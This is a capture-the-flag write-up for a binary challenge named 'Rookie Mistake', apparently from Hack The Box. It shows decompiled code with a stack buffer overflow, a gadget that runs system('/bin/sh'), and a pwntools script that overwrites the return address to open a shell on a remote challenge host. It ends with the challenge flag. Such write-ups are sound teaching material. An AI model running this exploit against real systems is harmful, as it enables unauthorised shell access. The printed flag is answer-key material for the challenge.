# Rookie Mistake

Decompiled in IDA:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rcx
  __int64 v4; // r8
  __int64 v5; // r9
  _QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF

  memset(&buf[1], 0, 24);
  banner(argc, argv, envp, v3, v4, v5, 0);
  printstr(&unk_4030AF);
  read(0, buf, 0x2Eu);
  info(&unk_4030C8);
  return 0;
}
```

There is a stack overflow vulnerability.

Get shell gadget:

```
.text:0000000000401758                 lea     rax, command    ; "/bin/sh"
.text:000000000040175F                 mov     rdi, rax        ; command
.text:0000000000401762                 call    _system
```

Attack:

```python
from pwn import *

elf = ELF("./rookie_mistake")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# p = process("./rookie_mistake")
p = remote("161.35.210.193", 32442)

# gdb.attach(p)
# pause()

system = 0x401758

# input limit: 0x2e bytes
p.sendline(b"A" * 0x28 + p64(system))
p.interactive()
```

Flag: `HTB{r3t2c0re_3sc4p3_th3_b1n4ry_d9ec08baee6647a56a37f6a9c8a551c7}`.
